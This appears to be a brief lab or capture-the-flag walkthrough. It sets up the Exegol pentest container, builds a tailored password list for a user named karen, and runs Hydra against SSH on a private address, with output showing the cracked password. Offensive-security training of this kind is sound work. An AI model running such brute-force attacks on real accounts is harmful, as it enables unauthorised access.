## Exegol Deployment

Install Exegol image:

```bash
exegol install free
```

Create and start container:

```bash
exegol start darkforest free
```

Open shell:

```bash
exegol shell darkforest
```

Verify tooling:

```bash
which hydra
which nmap
which netexec
which bloodhound-python
```

---

## Password Dictionary

Create dictionary:

```bash
cat > passwords.txt
```

Content:

```text
password
admin
root
karen
Welcome1
Password123
Emma2008!
Emma
Jean
2008
1998
Jean1998/
```

Verify:

```bash
cat passwords.txt
```

---

## Attack Execution

Launch Hydra SSH password attack:

```bash
hydra -l karen -P passwords.txt ssh://10.10.6.3
```

Hydra output:

```text
[22][ssh] host: 10.10.6.3
login: karen
password: Emma2008!
```

A valid credential was successfully identified for the target account.

